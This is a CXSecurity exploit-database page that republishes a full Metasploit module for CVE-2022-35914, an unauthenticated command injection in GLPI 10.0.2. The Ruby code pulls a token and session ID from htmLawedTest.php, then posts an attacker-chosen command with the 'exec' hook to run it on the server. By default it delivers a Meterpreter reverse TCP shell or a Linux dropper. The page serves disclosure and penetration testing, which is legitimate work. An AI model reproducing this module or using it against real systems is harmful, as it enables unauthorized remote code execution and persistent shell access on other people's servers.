---
title: GLPI 10.0.2 Command Injection
url: https://cxsecurity.com/issue/WLB-2022100064
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-10-26
fetch_date: 2025-10-03T20:51:21.099792
---

# GLPI 10.0.2 Command Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **GLPI 10.0.2 Command Injection** **2022-10-25 / 2022-10-26**  Credit:  **[bwatters-r7](https://cxsecurity.com/author/bwatters-r7/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2022-35914](https://cxsecurity.com/cveshow/CVE-2022-35914/ "Click to see CVE-2022-35914")**  CWE: **[CWE-78](https://cxsecurity.com/cwe/CWE-78 "Click to see CWE-78")** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
prepend Msf::Exploit::Remote::AutoCheck
include Msf::Exploit::Remote::HttpClient
include Msf::Exploit::CmdStager
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'GLPI htmLawed php command injection',
'Description' => %q{
This exploit takes advantage of a unauthenticated php command injection available
from GLPI versions 10.0.2 and below to execute a command.
},
'License' => MSF\_LICENSE,
'Author' => [
'cosad3s', # PoC https://github.com/cosad3s/CVE-2022-35914-poc
'bwatters-r7' # module
],
'References' => [
['CVE', '2022-35914' ],
['URL', 'https://github.com/cosad3s/CVE-2022-35914-poc']
],
'Platform' => 'linux',
'Arch' => [ARCH\_X64, ARCH\_CMD],
'CmdStagerFlavor' => [ 'printf' ],
'Targets' => [
[
'Unix Command',
{
'Platform' => 'unix',
'Arch' => ARCH\_CMD,
'Type' => :unix\_cmd,
'DefaultOptions' => {
'PAYLOAD' => 'cmd/unix/python/meterpreter/reverse\_tcp',
'RPORT' => 80,
'URIPATH' => '/glpi/'
}
}
],
[
'Linux (Dropper)',
{
'Platform' => 'linux',
'Arch' => [ARCH\_X64],
'DefaultOptions' => {
'PAYLOAD' => 'linux/x64/meterpreter/reverse\_tcp',
'RPORT' => 80,
'URIPATH' => '/glpi/'
},
'Type' => :linux\_dropper
}
],
],
'DisclosureDate' => '2022-01-26',
'DefaultTarget' => 0,
'Notes' => {
'Stability' => [ CRASH\_SAFE ],
'Reliability' => [ REPEATABLE\_SESSION ],
'SideEffects' => [ ARTIFACTS\_ON\_DISK, IOC\_IN\_LOGS ]
}
)
)
end
def populate\_values
uri = "#{datastore['URIPATH']}/vendor/htmlawed/htmlawed/htmLawedTest.php"
begin
res = send\_request\_cgi({
'method' => 'GET',
'uri' => normalize\_uri(uri),
'connection' => 'keep-alive',
'accept' => '\*/\*'
})
@html = res.get\_html\_document
@token = @html.at\_xpath('//input[@id="token"]')['value']
vprint\_status("token = #{@token}")
# sometimes I got > 1 sid. We must use the last one.
@sid = res.get\_cookies.match(/.\*=(.\*?);.\*/)[1]
vprint\_status("sid = #{@sid}")
rescue NoMethodError => e
elog('Failed to retrieve token or sid', error: e)
end
end
def execute\_command(cmd, \_opts = {})
populate\_values if @sid.nil? || @token.nil?
uri = datastore['URIPATH'] + '/vendor/htmlawed/htmlawed/htmLawedTest.php'
send\_request\_cgi({
'method' => 'POST',
'uri' => normalize\_uri(uri),
'cookie' => 'sid=' + @sid,
'ctype' => 'application/x-www-form-urlencoded',
'encode\_params' => true,
'vars\_post' => {
'token' => @token,
'text' => cmd,
'hhook' => 'exec',
'sid' => @sid
}
})
end
def check
populate\_values if @html\_doc.nil?
if @token.nil? || @sid.nil? || @html.nil?
return Exploit::CheckCode::Safe('Failed to retrieve htmLawed page')
end
return Exploit::CheckCode::Appears if @html.to\_s.include?('htmLawed')
return Exploit::CheckCode::Safe('Unable to determine htmLawed status')
end
def exploit
print\_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
case target['Type']
when :unix\_cmd
execute\_command(payload.encoded)
when :linux\_dropper
execute\_cmdstager
end
end
end

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022100064)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top